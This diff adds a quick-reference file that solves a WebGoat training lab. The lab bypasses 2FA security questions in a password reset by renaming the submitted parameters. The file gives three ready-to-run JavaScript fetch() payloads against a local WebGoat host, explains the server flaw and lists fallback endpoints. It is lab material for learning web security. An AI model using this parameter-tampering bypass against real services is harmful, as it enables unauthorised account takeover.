@@ -1,0 +1,77 @@
+====================================================================
+2FA PASSWORD RESET BYPASS - QUICK REFERENCE
+====================================================================
+
+CHALLENGE: Bypass 2FA security questions by tampering with parameters
+
+TECHNIQUE: Rename secQuestion0 and secQuestion1 to bypass validation
+
+====================================================================
+QUICK SOLUTION:
+====================================================================
+
+RECOMMENDED ATTACK (Try first):
+--------------------------------
+fetch('http://192.168.254.112:8001/WebGoat/auth-bypass/verify-account', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'secQuestion2=bypass&secQuestion3=attack'
+}).then(r => r.text()).then(console.log);
+
+
+ALTERNATIVE 1 (if first fails):
+--------------------------------
+fetch('http://192.168.254.112:8001/WebGoat/auth-bypass/verify-account', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'secQuestion1=test&secQuestion2=test'
+}).then(r => r.text()).then(console.log);
+
+
+ALTERNATIVE 2:
+--------------
+fetch('http://192.168.254.112:8001/WebGoat/auth-bypass/verify-account', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'secQuestion5=answer&secQuestion6=answer'
+}).then(r => r.text()).then(console.log);
+
+====================================================================
+THE TRICK:
+====================================================================
+
+Normal Request:
+  secQuestion0=answer1
+  secQuestion1=answer2
+
+Bypass Request:
+  secQuestion2=anything
+  secQuestion3=anything
+
+Why it works:
+  Server checks: "Did I receive 2 parameters?" ✓
+  Server DOESN'T check: "Are they the CORRECT parameters?" ❌
+
+====================================================================
+TOOLS AVAILABLE:
+====================================================================
+
+HTML Tool:     auth_bypass_2fa.html
+PowerShell:    auth_bypass_2fa.ps1
+Guide:         auth_bypass_2fa_guide.txt
+Quick Ref:     This file
+
+====================================================================
+POSSIBLE ENDPOINTS (if default doesn't work):
+====================================================================
+
+/WebGoat/auth-bypass/verify-account
+/WebGoat/PasswordReset/verify
+/WebGoat/PasswordReset/verify-account
+/WebGoat/PasswordReset/questions/verify
+/WebGoat/authentication-bypasses/verify-account
+
+====================================================================
